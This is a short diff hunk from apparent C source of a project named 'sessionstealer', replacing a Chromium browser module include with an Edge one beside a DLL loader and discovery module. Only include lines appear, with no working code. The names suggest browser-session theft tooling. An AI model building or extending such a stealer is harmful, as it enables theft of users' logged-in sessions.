@@ -3,7 +3,7 @@
 #include "sessionstealer/utils.h"
 #include "sessionstealer/dll_loader.h"
 #include "dlls/discovery/discovery.h"
-#include "dlls/chromium/chromium.h"
+#include "dlls/edge/edge.h"
 
 #include <stdlib.h>
 #include <stdio.h>
